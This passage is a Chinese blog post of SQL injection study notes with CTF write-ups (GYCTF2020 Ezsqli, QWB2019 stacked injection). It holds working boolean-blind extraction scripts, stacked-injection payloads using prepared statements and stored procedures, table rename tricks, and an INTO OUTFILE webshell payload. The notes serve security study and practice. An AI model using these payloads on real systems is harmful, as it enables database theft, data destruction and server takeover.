+<h3 id="select语句结构"><a href="#select语句结构" class="headerlink" title="select语句结构"></a>select语句结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">[all | distinct | distinctrow]</span><br><span class="line">[high_priority]</span><br><span class="line">[straight_join]</span><br><span class="line">[sql_small_result] [sql_big_result] [sql_buffer_result] [sql_cache] [sql_no_cache] ...</span><br><span class="line">select_expr[, select_expr ...]</span><br><span class="line">[from table_references</span><br><span class="line">[where condition]</span><br><span class="line">[group by &#123;col_name | expr | postion&#125;</span><br><span class="line">[asc|desc], ... [with rollup]]</span><br><span class="line">[having xxx]</span><br><span class="line">[order by xxx]</span><br><span class="line">[limit ]</span><br><span class="line">[procudure]</span><br><span class="line">[into outfile|into dumpfile|into var_name]</span><br><span class="line">[for update|lock in share mode]</span><br></pre></td></tr></table></figure>
+<h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
+<li>猜测sql语句结构，尝试插入逻辑语句来闭合语句，探测各种状态（成功、报错、waf）</li>
+<li>探测waf内容（用字典fuzz）</li>
+<li>尝试联合查询（union select）报错注入(Error based)</li>
+<li>是否可以时间盲注/布尔盲注？</li>
+<li>选择注出数据 user()/ @@user / database()</li>
+<li>完成payload user()-&gt;select flag from flag</li>
+</ol>
+<h3 id="SQLi-lab（SQL注入练习平台）-buuoj上就有"><a href="#SQLi-lab（SQL注入练习平台）-buuoj上就有" class="headerlink" title="SQLi-lab（SQL注入练习平台） buuoj上就有"></a>SQLi-lab（SQL注入练习平台） buuoj上就有</h3><p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>结合”SQL注入天书”，用来入门sql注入：<a target="_blank" rel="noopener" href="https://github.com/lcamry/sqli-labs">https://github.com/lcamry/sqli-labs</a><br>SQL注入刷题 buuoj</p>
+<h3 id="【布尔盲注-5-7新特性-无列名盲注】-GYCTF2020-Ezsqli"><a href="#【布尔盲注-5-7新特性-无列名盲注】-GYCTF2020-Ezsqli" class="headerlink" title="【布尔盲注/5.7新特性/无列名盲注】[GYCTF2020]Ezsqli"></a>【布尔盲注/5.7新特性/无列名盲注】[GYCTF2020]Ezsqli</h3><p>首先观察到<br>1 -&gt; nu1l<br>2 -&gt; V&amp;N<br>2-1 -&gt; nu1l<br>推测是id=x，使用逻辑语句闭合SQL语句。<br>id=1^(ascii(substr(database(),1,1))&gt;95)<br>// 因为过滤了or，所以我们用不了information_schema，这种情况下，我们通常考虑注本表里的数据，或者利用mysql5.7的新特性。<br>id=1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))&gt;95);  // 得到了 表名</p>
+<p>MySQL5.7中，sys库中有很多表存有table_name。查询表数据结构（有很多，基本都是从MySQL5.7开始的新特性）<br>● information_schema<br>● sys.schema_auto_increment_columns<br>● sys.schema_table_statistics_with_buffer<br>● sys.schema_index_statistics<br><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/sys-schema-index-statistics.html">https://dev.mysql.com/doc/refman/8.0/en/sys-schema-index-statistics.html</a><br>● mysql.innodb_table_stats<br><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.6/en/innodb-persistent-stats.html">https://dev.mysql.com/doc/refman/5.6/en/innodb-persistent-stats.html</a></p>
+<p>id=1^(ascii(substr((select group_concat(flag) from f1ag_1s_h3r3_hhhhh),1,1))&gt;95) //靠猜测，得到列名是flag</p>
+<p>// 或者选择使用无列名注入，分为两步，首先判断里面的列数（2列），进而逐渐注出数据<br>(select 1,1) &gt; (select <em> from websites)<br>(select 1,1,1) &gt; (select </em> from websites)<br>id=0^((1,’g’)&gt;(select * from f1ag_1s_h3r3_hhhhh))</p>
+<p>网上找到了一个题解。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://14b858fa-e701-47da-a11a-304ef60eb42d.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">s</span>):</span> <span class="comment">#十六进制转换 fl ==&gt; 0x666c</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment">#payload = &#x27;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i,mid) #爆库</span></span><br><span class="line">        <span class="comment">#payload = &#x27;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i,mid) #爆表</span></span><br><span class="line">        <span class="comment">#payload = &#x27;1^(ascii(substr((select group_concat(flag) from f1ag_1s_h3r3_hhhhh),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i,mid) #猜测f1ag_1s_h3r3_hhhhh中的列名为flag</span></span><br><span class="line">        key = (str_hex(res+<span class="built_in">chr</span>(mid)))</span><br><span class="line">        payload = <span class="string">&quot;1 ^ ( (select 1,&#123;&#125;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(key)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload </span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url = url,  data = data)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            print(<span class="string">&#x27;too fast&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span>  <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            right = mid </span><br><span class="line">        mid = left + ((right-left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#res += chr(mid) #爆表</span></span><br><span class="line">    res += <span class="built_in">chr</span>(mid<span class="number">-1</span>) <span class="comment">#爆flag</span></span><br><span class="line">    print(<span class="built_in">str</span>(mid),res)</span><br><span class="line"><span class="comment">#give_grandpa_pa_pa_pa</span></span><br><span class="line"><span class="comment">#news,users,f1ag_1s_h3r3_hhhhh,users233333333333333</span></span><br><span class="line"><span class="comment">#flag&#123;8ebdb3ac-1d0e-47f3-82d5-ef5b4d20fe70&#125;</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://bb098698-4715-4fbf-853c-23007c53cb41.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;FLAG&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>, <span class="number">128</span>):</span><br><span class="line">        flag1 = flag+<span class="built_in">chr</span>(x)</span><br><span class="line">        payload = <span class="string">&quot;0^((select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(flag1)</span><br><span class="line"></span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">        re = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    flag  += <span class="built_in">chr</span>(x<span class="number">-1</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="【堆叠注入】QWB2019-随便注"><a href="#【堆叠注入】QWB2019-随便注" class="headerlink" title="【堆叠注入】QWB2019 - 随便注"></a>【堆叠注入】QWB2019 - 随便注</h3><p>buuoj上有环境</p>
+<h4 id="1-查看数据库结构等"><a href="#1-查看数据库结构等" class="headerlink" title="1. 查看数据库结构等"></a>1. 查看数据库结构等</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from words;</span><br><span class="line">show variables like &#39;%file%&#39;; &#x2F;&#x2F;查看配置</span><br><span class="line">show create table words; &#x2F;&#x2F; 查看建表语句</span><br></pre></td></tr></table></figure>
+<h4 id="2-handler"><a href="#2-handler" class="headerlink" title="2. handler"></a>2. handler</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">handler被设计直接访问存储引擎（访问更快）</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)[ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;[ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;[ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">handler&#96;1919810931114514&#96;open;</span><br><span class="line">handler&#96;1919810931114514&#96;read first;</span><br></pre></td></tr></table></figure>
+<h4 id="3-set变量"><a href="#3-set变量" class="headerlink" title="3. set变量"></a>3. set变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set @sql&#x3D;&quot;select * from flag&quot;; # 转为了字符串</span><br><span class="line">prepare gogotttt from @sql;</span><br><span class="line">EXECUTE gogotttt;</span><br><span class="line"></span><br><span class="line">id&#x3D;1&#39;;sEt @xxxx&#x3D;concat(&quot;s&quot;,&quot;elect * from &#96;1919810931114514&#96;&quot;);</span><br><span class="line">id&#x3D;1&#39;;sEt @xxxx&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;</span><br><span class="line">prePare gogo from @xxxx;</span><br><span class="line">EXECUTE gogo;</span><br></pre></td></tr></table></figure>
+<h4 id="4-操作库-表"><a href="#4-操作库-表" class="headerlink" title="4. 操作库/表"></a>4. 操作库/表</h4><p>此操作不可逆，谨慎使用。<br>好的出题人可能会设置当前用户，alter/rename/drop的权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rename table &#96;words&#96; to &#96;wordsxxx&#96;;</span><br><span class="line">rename table &#96;1919810931114514&#96; to &#96;words&#96;;</span><br><span class="line"></span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100) character utf8_general_ci NOT NULL;# 修改表的结构</span><br><span class="line">或者</span><br><span class="line">alter table &#96;words&#96; add(id int default 1);</span><br></pre></td></tr></table></figure></p>
+<h4 id="5-本题的其他做法"><a href="#5-本题的其他做法" class="headerlink" title="5. 本题的其他做法"></a>5. 本题的其他做法</h4><p>写webshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload &#x3D; &quot;select &#39;&lt;?php phpinfo();&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;sissel123.php&#39;&quot;</span><br><span class="line">output &#x3D; &#39;&#39;&#39;</span><br><span class="line">set @sql&#x3D;0x&#123;&#125;;</span><br><span class="line">PREPARE gogo FROM @sql;</span><br><span class="line">EXECUTE gogo;</span><br><span class="line">&#39;&#39;&#39;.format(payload.encode(&#39;hex&#39;)).replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line"></span><br><span class="line">print output</span><br></pre></td></tr></table></figure></p>
+<h4 id="6-使用存储过程"><a href="#6-使用存储过程" class="headerlink" title="6. 使用存储过程"></a>6. 使用存储过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create procedure funct(out string text(1024))</span><br><span class="line">begin</span><br><span class="line">  set string&#x3D;0x73656c65637420666c61672066726f6d206031393139383130393331313134353134603b;</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line">call funct(@payload);   # 将@payload的值赋为0x73656c65637420666……;</span><br><span class="line">prepare bbb from @payload;  # 预处理</span><br><span class="line">execute bbb;  # 执行</span><br><span class="line"></span><br><span class="line">最终payload：</span><br><span class="line">?inject&#x3D;1&#39;;create procedure funct(out string text(1024)) begin set string&#x3D;0x73656c65637420666c61672066726f6d206031393139383130393331313134353134603b;end;#</span><br><span class="line"></span><br><span class="line">?inject&#x3D;1&#39;;call funct(@payload);prepare bbb from @payload;execute bbb;deallocate bbb;#</span><br></pre></td></tr></table></figure>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ol>
+<li>猜测列数<br>order by、union select</li>
+<li>报错注入<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/like98k/article/details/79646512">https://blog.csdn.net/like98k/article/details/79646512</a></li>
+<li>无列名注入（以比较、join的思路）or informa</li>
+<li>8.0新特性（TABLE t;）<br><a target="_blank" rel="noopener" href="http://wh1sper.com/roarctf-2020/">http://wh1sper.com/roarctf-2020/</a></li>
+<li>除了information_schema以外，还有哪些表有库表列。（5.7新特性）</li>
+<li>二次注入（做完对应题之后，考虑为什么有这个洞）<br>多搜搜</li>
+</ol>
+<h2 id="补充2"><a href="#补充2" class="headerlink" title="补充2"></a>补充2</h2><ol>
+<li>md5注入<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/greyfreedom/article/details/45846137">https://blog.csdn.net/greyfreedom/article/details/45846137</a></li>
+<li>奇怪的绕过方法<br>sleep/**/(5)</li>
+<li>sql注入 getshell（读写文件）<br> a. into outfile<br> b. log<br> c. phpmyadmin cve<br>load_file(/var/www/html/config.php)</li>
+</ol>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://aisissel.com">Sissel</a>
+            <p>原文链接：<a href="http://aisissel.com/2020/12/02/study-sqli/">http://aisissel.com/2020/12/02/study-sqli/</a>
+            <p>发表日期：<a href="http://aisissel.com/2020/12/02/study-sqli/">December 2nd 2020, 10:15:27 pm</a>
+            <p>更新日期：<a href="http://aisissel.com/2020/12/02/study-sqli/">December 17th 2020, 5:12:38 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/10/05/study-hashcat_aircrack_wifi_wpa/" title= "【学习】hashcat爆破、wifi握手包工具总结">
+                    <div class="prevTitle">【学习】hashcat爆破、wifi握手包工具总结</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:boke1208#gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/boke1208" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.weibo.com/1867954903/profile" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://twitter.com/SisselZhao" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://space.bilibili.com/784419" class="iconfont-archer bilibili" target="_blank" title=bilibili></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">SQL注入分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E8%AF%AD%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">SQL语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.1.</span> <span class="toc-text">查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%9C%B4%E5%AE%9E%E7%9A%84%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.2.</span> <span class="toc-text">更朴实的查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E6%95%B0%E6%8D%AE"><span class="toc-number">2.3.</span> <span class="toc-text">在命令行中查看数据库和数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%9D%A1%E4%BB%B6%E3%80%81%E6%AF%94%E8%BE%83%EF%BC%88%E7%AE%97%E6%95%B0%E8%BF%90%E7%AE%97%E7%AC%A6-gt-lt-%EF%BC%8C%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6-%E4%B8%8E-%E6%88%96-%E9%9D%9E%EF%BC%89"><span class="toc-number">2.4.</span> <span class="toc-text">逻辑条件、比较（算数运算符 &gt; &lt; &#x3D;，逻辑运算符 与 或 非）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#limit%E3%80%81order-by"><span class="toc-number">2.5.</span> <span class="toc-text">limit、order by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C%E5%A4%84%E7%90%86"><span class="toc-number">2.6.</span> <span class="toc-text">对查询结果处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">2.7.</span> <span class="toc-text">sql语言中的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E5%AD%97%E7%AC%A6%E5%92%8Cascii%E5%BC%80%E5%A7%8B"><span class="toc-number">2.8.</span> <span class="toc-text">从字符和ascii开始</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E5%8F%96"><span class="toc-number">2.9.</span> <span class="toc-text">字符串截取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%97%E6%95%B0%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">2.10.</span> <span class="toc-text">算数运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6-%E6%AF%94%E8%BE%83"><span class="toc-number">2.11.</span> <span class="toc-text">算术运算符-比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6-%E6%AF%94%E8%BE%832"><span class="toc-number">2.12.</span> <span class="toc-text">算术运算符-比较2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0"><span class="toc-number">2.13.</span> <span class="toc-text">其他函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.14.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">2.15.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E5%BE%85"><span class="toc-number">2.16.</span> <span class="toc-text">等待</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84%E5%BA%93"><span class="toc-number">2.17.</span> <span class="toc-text">特殊的库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD"><span class="toc-number">2.18.</span> <span class="toc-text">判断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E5%A5%BD%E7%9A%84payload%EF%BC%88%E4%BD%BF%E7%94%A8group-concat%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">更好的payload（使用group_concat）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#select%E8%AF%AD%E5%8F%A5%E7%BB%93%E6%9E%84"><span class="toc-number">3.2.</span> <span class="toc-text">select语句结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.3.</span> <span class="toc-text">注入步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi-lab%EF%BC%88SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0%EF%BC%89-buuoj%E4%B8%8A%E5%B0%B1%E6%9C%89"><span class="toc-number">3.4.</span> <span class="toc-text">SQLi-lab（SQL注入练习平台） buuoj上就有</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-5-7%E6%96%B0%E7%89%B9%E6%80%A7-%E6%97%A0%E5%88%97%E5%90%8D%E7%9B%B2%E6%B3%A8%E3%80%91-GYCTF2020-Ezsqli"><span class="toc-number">3.5.</span> <span class="toc-text">【布尔盲注&#x2F;5.7新特性&#x2F;无列名盲注】[GYCTF2020]Ezsqli</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E3%80%91QWB2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">4.1.</span> <span class="toc-text">【堆叠注入】QWB2019 - 随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84%E7%AD%89"><span class="toc-number">4.1.1.</span> <span class="toc-text">1. 查看数据库结构等</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-handler"><span class="toc-number">4.1.2.</span> <span class="toc-text">2. handler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-set%E5%8F%98%E9%87%8F"><span class="toc-number">4.1.3.</span> <span class="toc-text">3. set变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%93%8D%E4%BD%9C%E5%BA%93-%E8%A1%A8"><span class="toc-number">4.1.4.</span> <span class="toc-text">4. 操作库&#x2F;表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%9C%AC%E9%A2%98%E7%9A%84%E5%85%B6%E4%BB%96%E5%81%9A%E6%B3%95"><span class="toc-number">4.1.5.</span> <span class="toc-text">5. 本题的其他做法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E4%BD%BF%E7%94%A8%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">4.1.6.</span> <span class="toc-text">6. 使用存储过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">5.</span> <span class="toc-text">补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%852"><span class="toc-number">6.</span> <span class="toc-text">补充2</span></a></li></ol>
+    </div>
+    
